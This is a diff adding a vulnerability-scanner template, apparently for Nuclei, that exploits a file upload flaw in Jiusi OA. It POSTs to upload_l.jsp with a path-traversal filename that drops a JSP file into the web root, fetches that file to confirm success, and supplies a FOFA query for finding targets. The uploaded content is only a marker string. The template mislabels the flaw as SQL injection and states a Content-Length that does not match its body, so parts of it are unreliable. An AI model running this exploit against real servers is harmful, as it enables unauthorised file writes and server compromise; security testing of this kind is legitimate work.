@@ -1,0 +1,37 @@
+id: jiusi-upload_l-fileupload
+
+info:
+  name: 九思OA-文件上传-upload_l
+  author: HuanXiong
+  severity: high
+  metadata: 
+    fofa-query: app="九思软件-OA" || body="/jsoa/login.jsp"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /jsoa/wpsforlinux/src/upload_l.jsp?openType= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept: text/css,*/*;q=0.1
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: 
+        filename: ../../../ROOT/123.jsp
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWjfyX3yvqhAeLK8G
+        Content-Length: 16575
+
+        12321
+
+      - |
+        GET /123.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_2,"12321")
